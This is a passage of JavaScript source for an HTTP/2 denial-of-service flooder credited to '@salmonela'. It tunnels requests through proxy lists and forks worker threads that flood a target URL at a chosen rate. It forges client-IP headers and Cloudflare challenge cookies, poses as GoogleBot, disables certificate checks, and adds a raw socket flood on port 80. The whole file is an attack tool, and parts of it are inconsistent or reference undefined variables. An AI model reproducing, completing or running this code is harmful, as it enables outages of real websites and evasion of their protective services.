    '(AtakeBrowser 2_0)',
    '(NasaChecker)',
    '(CloudFlareIUAM)',
    '(NginxChecker)',
    '(AAPanel)',
    '(AntiLua)',
    '(FushLua)',
    '(FBIScan)',
    '(FirefoxTop)',
    '(ChinaNet Bot)'
   ];
 
 const queryStrings = [
    "&", 
    "=", 
  ];
  
  const pathts = [
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment", 
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
    "/?r=*****",
    "/?r=12364",
    "/?r=16364",
    "/?r=65655",
    "/?r=65955",
    "/?r=14254",
    "/?r=12654",
    "/?r=66455",
    "/?r=18694",
    "/?r=12364",
    "/?r=6566664645",
    "/?r=125234",
    "/?r=16365",
    "/?r=16354",
    "/?r=123964",
    "/?r=656664645",
    "/?r=12524",
    "/?r=163665",
    "/?r=16354",
    "/?r=12334",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F1]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F16685]&b=[+N5]",
    "/?a=[+F8551]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F56551]&b=[+N5]",
    "/?a=[+F1350]&b=[+N52]",
    "/?a=[+F1520]&b=[+N52]",
    "/?uername=zlq&age=20",
    "/?uername=zlq&age=2",
    "?__cf_chl_tk=",
    "?__cf_chl_rt_tk=",
    "/?yqlaje=an4ux1&amp;__CBK=3f3c8201870c33a8b8c92687ed8a1698d1603344084_326369&amp;wmnqjm=agpws2&amp;naxyty=jxxv22&amp;fktade=draxv1&amp;qybcjc=4pyt12&amp;vunwfk=dgwq82&qifuha=gk0u32",
];

function getRandomCookie() {
    const cookies = [
     'cf_clearance=' + randstr(25),
    '__cf_bm=' + randstr(16),
    '__cfduid=' + randstr(43),
    '__cf_chl_rt_tk=' + randstr(43),
    'session_id=' + randstr(32),
    'auth_token=' + randstr(50),
    'user_id=' + randstr(12),
    'tracking_id=' + randstr(20),
    'csrftoken=' + randstr(64),
    'pref=' + randstr(10),
    'locale=' + randstr(5),
    'cf_chl_prog=' + randstr(8),
    'cf_chl_rc_m=' + randstr(10),
    'cf_chl_seq_x_y=' + randstr(15),
    'cf_chl_2=' + randstr(18),
    '__cf_blr=' + randstr(22),
    'cfbm=' + randstr(16),
    'cfobinfo=' + randstr(32),
    'cfbmsv=' + randstr(16),
    'cfob=' + randstr(32),
    'cfobtc=' + randstr(16),
    'cfbmsz=' + randstr(16),
    'cfbmsvsz=' + randstr(16),
    'cfbmsz2=' + randstr(16),
    'cf_chl_seq=' + randstr(20),
    'cf_chl_prog_r=' + randstr(10),
    'cf_chl_rt=' + randstr(18),
    'cf_chl_rr=' + randstr(15),
    'cf_chl_tk=' + randstr(20),
    'cf_chl_uh=' + randstr(10),
    'cf_chl_captcha=' + randstr(25),
    'cf_chl_ec=' + randstr(18),
    'cf_chl_ctx=' + randstr(12),
    'cf_chl_log=' + randstr(15),
    'cf_chl_ki=' + randstr(20),
    'cf_chl_captcha_=' + randstr(25),
    'cf_chl_cd=' + randstr(18),
    'cf_chl_opt=' + randstr(16),
    'cf_chl_1=' + randstr(22),
    'cf_chl_ch_r=' + randstr(15),
    'cf_chl_av=' + randstr(10),
    'cf_chl_pass=' + randstr(20),
    'cf_chl_key=' + randstr(22),
    'cf_chl_action=' + randstr(18),
    'cf_chl_ft=' + randstr(16),
    'cf_chl_user=' + randstr(12),
    'cf_chl_token=' + randstr(30),
    'cf_chl_id=' + randstr(15),
    'cf_chl_auth=' + randstr(30),
    'cf_chl_bc=' + randstr(25),
    'cf_chl_bw=' + randstr(18),
    'cf_chl_ct=' + randstr(16),
    'cf_chl_dt=' + randstr(20),
    'cf_chl_ex=' + randstr(15),
    'cf_chl_g=' + randstr(22),
    'cf_chl_h=' + randstr(28),
    'cf_chl_j=' + randstr(30),
    'cf_chl_l=' + randstr(32),
    'cf_chl_m=' + randstr(18),
    'cf_chl_n=' + randstr(20),
    'cf_chl_p=' + randstr(22),
    'cf_chl_q=' + randstr(25),
    'cf_chl_s=' + randstr(28),
    'cf_chl_v=' + randstr(30),
    'cf_chl_x=' + randstr(32),
    'cf_chl_z=' + randstr(18),
    'cf_chl_y=' + randstr(20),
    'cf_chl_w=' + randstr(25),
    ];
    return cookies.join('; ');
}


  const mozilla = [
    'Mozilla/5.0 ',
    'Mozilla/6.0 ',
    'Mozilla/7.0 ',
    'Mozilla/8.0 ',
    'Mozilla/9.0 '
   ];

   function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }

try {
var uap = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
 } catch(error){
     console.log('Fail to load ua.txt')
     process.exit(1);
 }
          function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const browserVersion = getRandomInt(120, 123);

const browsers = ['Google Chrome', 'Brave'];
const selectedBrowser = browsers[Math.floor(Math.random() * browsers.length)];

let brandValue;
if (browserVersion === 120) {
    brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${selectedBrowser}";v="${browserVersion}"`;
}
else if (browserVersion === 121) {
    brandValue = `"Not A(Brand";v="99", "${selectedBrowser}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
}
else if (browserVersion === 122) {
    brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${selectedBrowser}";v="${browserVersion}"`;
}
else if (browserVersion === 123) {
    brandValue = `"${selectedBrowser}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
}

const version = `${brandValue}`;

 const site = [
  'cross-site',
  'same-origin',
  'same-site',
  'none'
];

const mode = [
  'cors',
  'navigate',
  'no-cors',
  'same-origin',
  'websocket',
  'fetch',
  'stream',
  'download',
  'upload',
  'polling'
];

const dest = [
  'audio',
  'audioworklet',
  'document',
  'embed',
  'empty',
  'font',
  'frame',
  'iframe',
  'image',
  'manifest',
  'object',
  'paintworklet',
  'report',
  'script',
  'serviceworker',
  'sharedworker',
  'style',
  'track',
  'video',
  'worker',
  'xslt',
  'form',
  'xhr',
  'eventsource',
  'navigation',
  'beacon',
  'csp-report',
  'ping',
  'ping-report'
];
 
 
  
const platform = [
  "Windows",
  "Windows Phone",
  "Macintosh",
  "Linux",
  "iOS",
  "Android",
  "PlayStation 4",
  "Xbox One",
  "Nintendo Switch",
  "Apple TV",
  "Amazon Fire TV",
  "Roku",
  "Chromecast",
  "Smart TV",
  "Other",
  "Chrome OS",
  "Ubuntu",
  "FreeBSD",
  "BlackBerry",
  "Windows Mobile",
  "Apple Watch",
  "Android TV",
  "Nintendo 3DS",
  "Windows 98",
  "Windows XP",
  "Windows Vista",
  "Windows 7",
  "Windows 8",
  "Windows 10",
  "Windows Server",
  "macOS",
  "watchOS",
  "tvOS",
  "iPadOS",
  "Kindle Fire OS",
  "Fire OS",
  "Android Wear OS",
  "Tizen",
  "WebOS",
  "Windows RT",
  "Windows RT 8.1",
  "Windows Embedded Compact",
  "Windows Phone 7",
  "Windows Phone 8",
  "Windows Phone 8.1",
  "Windows Phone 10",
  "Symbian",
  "MeeGo",
  "Bada",
  "Palm OS",
  "Solaris",
  "AIX",
  "IRIX",
  "HP-UX",
  "AmigaOS",
  "OS/2",
  "BeOS",
  "MS-DOS"
];

   const headerGenerator = new HeaderGenerator({
  'browsers': [{
    'name': "firefox",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "opera",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "edge",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "safari",
    'minVersion': 0x10,
    'httpVersion': '2'
  }],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', "linux", "macos", 'android', 'ios'],
  'locales': ["en-US", 'en']
});

const randomHeaders = headerGenerator.getHeaders();

const nullHexs = [
    "\x00", 
    "\xFF", 
    "\xC2", 
    "\xA0",
    "\x82",
    "\x56",
    "\x87",
    "\x88",
    "\x27",
    "\x31",
    "\x18",
    "\x42",
    "\x17",
    "\x90",
    "\x14",
    "\x82",
    "\x18",
    "\x26",
    "\x61",
    "\x04",
    "\x05",
    "\xac",
    "\x02",
    "\x50",
    "\x84",
    "\x78"
    ];

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var query = queryStrings[Math.floor(Math.floor(Math.random() * queryStrings.length))];
 var pathx = pathts[Math.floor(Math.floor(Math.random() * pathts.length))];
 var mos = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
 var az1 = useragents[Math.floor(Math.floor(Math.random() * useragents.length))];
 var dest1 =  dest[Math.floor(Math.floor(Math.random() *  dest.length))];
 var mode1 =  mode[Math.floor(Math.floor(Math.random() *  mode.length))];
 var pf =  platform[Math.floor(Math.floor(Math.random() *  platform.length))];
 var ver =  version[Math.floor(Math.floor(Math.random() *  version.length))];
 var site1 =  site[Math.floor(Math.floor(Math.random() *  site.length))];
 
    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (getRandomCookie() || Ref) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }
    
   const rateHeaders = [
    { "viewport-height":"1080"  },
    { "viewport-width": "1920"  },
    { "device-memory": "0.25" },
    { "HTTP2-Setting": Math.random() < 0.5 ? 'token64' : 'token68' },
    { "akamai-origin-hop": randstr(5)  },
    { "source-ip": randstr(5)  },
    { "via": randstr(5)  },
    { "cluster-ip": randstr(5)  },
    { "accept-charset": accept },
    { "accept-datetime": accept },
    { "accept-encoding": encoding },
    { "worker": Math.random() < 0.5 ? 'true' : 'null'},
    { "expect-ct": "enforce"},
    { "accept-patch": accept },
    { 'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none'},
    { "dnt": "1"  },
    { "accept-language": lang },
    { "upgrade-insecure-requests": "1" },
    { "Cache-Control": control },
    { "Content-Encoding": encoding },
    { "content-type": randomHeaders["content-type"] },
    { "Access-Control-Request-Method": Methods }, 
    { "Expect": "100-continue" },
    { "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
    { "From": "user@gmail.com" },
    { "Max-Forwards": "10" },
    { "pragma": control },
    { "CF-Connecting-IP": spoofed }, 
    { "CF-EW-Client-IP": spoofed }, 
    { "CF-Challenge-Response": generateRandomString(32) },
    { "CF-Request-ID": generateRandomString(24) },
    { "X-Requested-With": "XMLHttpRequest" },
    { "X-Forwarded-For": spoofed },
    { "X-Vercel-Cache": randstr(15) },
    { "TK": "?" },
    { "X-Frame-Options": randomHeaders["X-Frame-Options"] },
    { "Alt-Svc": randomHeaders["Alt-Svc"] },
    { "X-ASP-NET": randstr(25) },
    { "Refresh": "5" },
    { "x-request-data": "dynamic" },
    { "X-Content-Duration": spoofed },
    { "Clear-Site-Data": Math.random() < 0.5 ? 'cache' : 'cookies' }, 
    { "cf-cache-status": Math.random() < 0.5 ? 'BYPASS' : 'HIT' },
    { "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },  
    { "referer": Ref },
    { "worker": Math.random() < 0.5 ? 'true' : 'null'},
    { "expect-ct": "enforce" },
    { 'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none' },
    { "dnt": "1" },
    ];
    const rateHeaders2 = [
    { "viewport-height":"1080"  },
    { "viewport-width": "1920"  },
    { "device-memory": "0.25" },
    { "HTTP2-Setting": Math.random() < 0.5 ? 'token64' : 'token68' },
    { "akamai-origin-hop": randstr(5)  },
    { "source-ip": randstr(5)  },
    { "via": randstr(5)  },
    { "cluster-ip": randstr(5)  },
    { "accept-charset": accept },
    { "accept-datetime": accept },
    { "accept-encoding": encoding },
    { "worker": Math.random() < 0.5 ? 'true' : 'null'},
    { "expect-ct": "enforce"},
    { "accept-patch": accept },
    { 'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none'},
    { "dnt": "1"  },
    { "accept-language": lang },
    { "upgrade-insecure-requests": "1" },
    { "Cache-Control": control },
    { "Content-Encoding": encoding },
    { "content-type": randomHeaders["content-type"] },
    { "Access-Control-Request-Method": Methods }, 
    { "Expect": "100-continue" },
    { "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
    { "From": "user@gmail.com" },
    { "Max-Forwards": "10" },
    { "pragma": control },
    { "CF-Connecting-IP": spoofed }, 
    { "CF-EW-Client-IP": spoofed }, 
    { "CF-Challenge-Response": generateRandomString(32) },
    { "CF-Request-ID": generateRandomString(24) },
    { "X-Requested-With": "XMLHttpRequest" },
    { "X-Forwarded-For": spoofed },
    { "X-Vercel-Cache": randstr(15) },
    { "TK": "?" },
    { "X-Frame-Options": randomHeaders["X-Frame-Options"] },
    { "Alt-Svc": randomHeaders["Alt-Svc"] },
    { "X-ASP-NET": randstr(25) },
    { "Refresh": "5" },
    { "x-request-data": "dynamic" },
    { "X-Content-Duration": spoofed },
    { "Clear-Site-Data": Math.random() < 0.5 ? 'cache' : 'cookies' }, 
    { "cf-cache-status": Math.random() < 0.5 ? 'BYPASS' : 'HIT' },
    { "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
    { "referer": Ref },
    { "worker": Math.random() < 0.5 ? 'true' : 'null'},
    { "expect-ct": "enforce" },
    { 'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none' },
    { "dnt": "1" },
    ];
    

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
          core: args.threads % os.cpus().length
          console.clear()
          console.log(`[!] ATTACK SUCCES !`);
          console.log(`[!] FLOODER BY @salmonela.`);
          console.log(gradient.vice(`------------------------------------------`))
          console.log(gradient.vice(`Target: `+ process.argv[2]))
          console.log(gradient.vice(`Time: `+ process.argv[3]))
          console.log(gradient.vice(`Rate: `+ process.argv[4]))
          console.log(gradient.vice(`Thread: ` + process.argv[5]))
          console.log(gradient.vice(`Proxy: ` + process.argv[6]))
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 
 const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":method"] = "PUT";
headers[":method"] = "HEAD";
headers[":method"] = "CONNECT";
headers[":method"] = "DELETE";
headers[":method"] = "OPTIONS";
headers[":method"] = "TRACE";
headers[":method"] = "PATCH";
 headers[":authority"] = parsedTarget.host + ":443";
 headers[":authority"] = parsedTarget.host + ":80";
 headers[":authority"] = parsedTarget.host
 headers["origin"] = "https://" + parsedTarget.host
 headers["origin"] = "https://" + parsedTarget.host + ":80"; // Include port 80 in origin header
 headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
 headers["Via"] = "1.2" + parsedTarget.host + spoofed2 + ":443"; // Include port 80 in Via header
 headers["Via"] = "1.2" + parsedTarget.host + spoofed2 + ":80"; // Include port 80 in Via header
 headers["Via"] = spoofed2
 headers[":path"] = parsedTarget.path + pathx + randstr(10) + query + randstr(10) + ":443"; 
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
 headers[":scheme"] = "https";
 headers[":scheme"] = parsed.protocol.replace(':', '');
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 headers["accept"] = accept;
 headers["referer"] = Ref + mysor1;
 headers["user-agent"] = uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
 headers["content-type"] = randomHeaders["content-type"];
 headers["media-type"] = randomHeaders["media-type"];
 headers["cf-cache-status"] = "BYPASS", "HIT", "DYNAMIC";
 headers["expires"] = "0";
 headers["cache-control"] = control;
 headers["pragma"] = control;
 headers["vary"] = randomHeaders["vary"]; // Menyatakan variasi yang mempengaruhi respons
 headers["x-cache-status"] = "BYPASS", "HIT", "DYNAMIC";
 headers["x-download-options"] = randomHeaders['x-download-options'];
 headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
 headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
 headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
 headers["x-cache"] = randomHeaders['x-cache'];
 headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
 headers["Allow"] = randomHeaders["Allow"];
 headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
 headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
 headers["x-frame-options"] = randomHeaders['x-frame-options'];
 headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
 headers["x-content-type-options"] = randomHeaders["x-content-type-options"];
 headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
 headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
 headers["X-XSS-Protection"] = "1; mode=block";
 headers["Clear-Site-Data"] = "cache", "cookies";
 headers["x-request-id"] = randomHeaders["x-request-id"]; 
 headers["x-dns-prefetch-control"] = randomHeaders["x-dns-prefetch-control"]; 
 headers["upgrade-insecure-requests"] = randomElement(["0", "1"]);
 headers["Feature-Policy"] =  randomHeaders["Feature-Policy"];
 headers["x-request-data"] = "BYPASS", "HIT", "DYNAMIC"; // Menentukan waktu kedaluwarsa respons
 headers["Surrogate-Control"] = randomHeaders["Surrogate-Control"]; // Menentukan berapa lama cache akan menyimpan respons
 headers["Cross-Origin-Resource-Policy"] = randomHeaders["Cross-Origin-Resource-Policy"]; // Menentukan kebijakan sumber daya lintas asal untuk melindungi privasi pengguna
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["Real-IP"] = spoofed;
headers["sss"] = spoofed;
headers["X-Server"] = spoofed;
headers["Forwarded-HTTPS"] = spoofed;
headers["X-True-Client-IP"] = spoofed;
headers["X-Cluster-Client-IP"] = spoofed;
headers["X-Client-IP"] = spoofed;
headers["X-Remote-IP"] = spoofed;
headers["X-Remote-Addr"] = spoofed;
headers["X-Client-Host"] = spoofed;
headers["X-Client-User"] = spoofed;
headers["X-ProxyUser-Ip"] = spoofed;
headers["X-Original-Forwarded-For"] = spoofed;
headers["X-Originating-IP"] = spoofed;
headers["X-Forwarded-Server"] = spoofed;
headers["X-Real-IP"] = spoofed;
headers["X-Request-Start"] = spoofed;
headers["X-UIDH"] = spoofed;
headers["X-Custom-IP-Authorization"] = spoofed;
headers["CF-Connecting-IP"] = spoofed;
headers["True-Client-IP"] = spoofed;
headers["Forwarded"] = spoofed;
headers["Client-IP"] = spoofed;
headers["Proxy-Client-IP"] = spoofed;
headers["WL-Proxy-Client-IP"] = spoofed;
headers["HTTP_X_FORWARDED_FOR"] = spoofed;
headers["HTTP_X_FORWARDED_HOST"] = spoofed;
headers["HTTP_X_FORWARDED_SERVER"] = spoofed;
headers["X-Requested-With"] = "XMLHttpRequest";
headers["sec-ch-ua"] = ver;
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = pf + mysor;
headers["sec-ch-ua-platform-version"] = randomHeaders["sec-ch-ua-platform-version"];
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-mode"] = mode1;
headers["sec-fetch-site"] = site1;
headers["sec-ch-ua-model"] = randomHeaders["sec-ch-ua-model"];
headers["sec-ch-ua-arch"] = randomHeaders["sec-ch-ua-arch"];
headers["sec-ch-ua-full-version"] = randomHeaders["sec-ch-ua-full-version"];
headers["sec-ch-ua-bitness"] = randomHeaders["sec-ch-ua-bitness"];
headers["sec-ch-ua-platform-type"] = randomHeaders["sec-ch-ua-platform-type"];
headers["sec-fetch-user"] = randomElement(["?0", "?1"]);
headers["sec-origin-policy"] = randomHeaders["sec-origin-policy"];
headers["sec-content-security-policy"] = randomHeaders["sec-content-security-policy"];
headers["DNT"] = randomElement(["0", "1"]);
headers["RTT"] = randomElement(["510", "255"]);
headers["Ect"] = randomElement(["3g", "2g", "5g"]);
headers["DPR"] = "2.0";
headers["Service-Worker-Navigation-Preload"] = "true";       
headers["TE"] = "trailers";
headers["Trailer"] = "Max-Forwards";
headers["set-cookie"] = randomHeaders["set-cookie"];
headers["cookie"] = randomHeaders["cookie"] + "; " + getRandomCookie();
headers["Alt-Svc"] = randomHeaders["Alt-Svc"];
headers["Sec-Websocket-Key"] = spoofed2;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["Server"] = randomHeaders["Server"];
headers["range"] = randomHeaders["range"];
headers["downlink"] = randomHeaders["downlink"];
headers["viewport-width"] = randomHeaders["viewport-width"];
headers["width"] = randomHeaders["width"];
headers["Accept-CH"] = randomHeaders["Accept-CH"];
headers["memory-device"] = randomHeaders["memory-device"];
headers["content-lenght"] = randomHeaders["content-lenght"];
headers["cdn-loop"] = parsedTarget.host;
headers["CF-Ray"] = randomHeaders["CF-Ray"];  // Example header added by Cloudflare
headers["CF-Connecting-IP"] = spoofed;       // The original visitor IP address
headers["CF-IPCountry"] = randomHeaders["CF-IPCountry"];  // Country of the original request
headers["CF-Visitor"] = '{"scheme":"https"}';  // Indicates the scheme (http or https) of the original request
headers["CF-Worker"] = randomHeaders["CF-Worker"];  // Information about the Cloudflare worker handling the request
headers["CF-RAY"] = randomHeaders["CF-RAY"];  // Another example of CF-Ray header
headers["upgrade"] = "h2c"; // HTTP/2 cleartext upgrade
headers["Except"] = "100-continue";
headers["Forwarder"] = "for=192.168.0.1;proto=http";
headers["From"] = "user@gmail.com";
 

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     let headers = {};
     const parsedProxy = proxyAddr.split(":"); 
     headers["cookie"] = randomHeaders["cookie"] + getRandomCookie();
         
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         
                    const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
      
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
ALPNProtocols: [
        "h2",             // HTTP/2
        "http/1.1",       // HTTP/1.1
        "http/1.0",       // HTTP/1.0
        "http/2+quic/43", // HTTP/2 over QUIC draft 43
        "http/2+quic/44", // HTTP/2 over QUIC draft 44
        "http/2+quic/45", // HTTP/2 over QUIC draft 45
        "h3-23",          // HTTP/3 draft 23
        "h3-24",          // HTTP/3 draft 24
        "h3-25",          // HTTP/3 draft 25
        "h3-26",          // HTTP/3 draft 26
        "h3-27",          // HTTP/3 draft 27
        "h3",             // HTTP/3
        "quic/1"          // QUIC version 1
    ],
            sigals: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "auto",
            host: parsedTarget.host,
            Compression: true,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            method: Methods,
            followAllRedirects: false,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            secureOptions: secureOptions,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_3_method", "TLSv1_2_method", "TLSv1_1_method", "TLSv1_method"],
            }
           
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
        tlsConn.setKeepAlive(true, 60000);
        
const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                            const dynHeaders = {
                  ...headers,
                  ...rateHeaders[Math.floor(Math.floor(Math.random() *  rateHeaders.length))],
                  ...rateHeaders2[Math.floor(Math.floor(Math.random() *  rateHeaders2.length))],
                };
                for (let i = 0; i < args.Rate; i++) {
                const request = client.request(dynHeaders)
                    
                    .on("response", response => {
                             if(response['set-cookie']) {
                            headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));   
                         request.close();
                      request.destroy();                                    
                        return
                        }
                    });                  
                      request.write(crypto.randomBytes(64));
                    request.end();
                }
   const streamId = crypto.randomBytes(4).readUInt32BE(0) & 0x7fffffff;
   const headersFrameHeader = Buffer.alloc(9);
    
    headersFrameHeader.writeUInt32BE(headers.length, 0);
    headersFrameHeader[3] = 0x1;
    headersFrameHeader[4] = 0x0;
    headersFrameHeader[5] = 0x0;
    headersFrameHeader[6] = 0x1;
    headersFrameHeader[7] = 0x0;
    headersFrameHeader[8] = streamId;
    
           socket.write(headersFrameHeader);
           socket.write(Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'));
           socket.write(Buffer.from('000012040000000000'));    
           socket.write(Buffer.from('000004080000000001'));  
               }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }

    //method
    var s = require('net').Socket();
    s.connect(80, parsedTarget.host);
    s.setTimeout(10000);
    for (var i = 0; i < args.threads; i++) {
        s.write('GET ' + parsedTarget.host + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write('HEAD ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
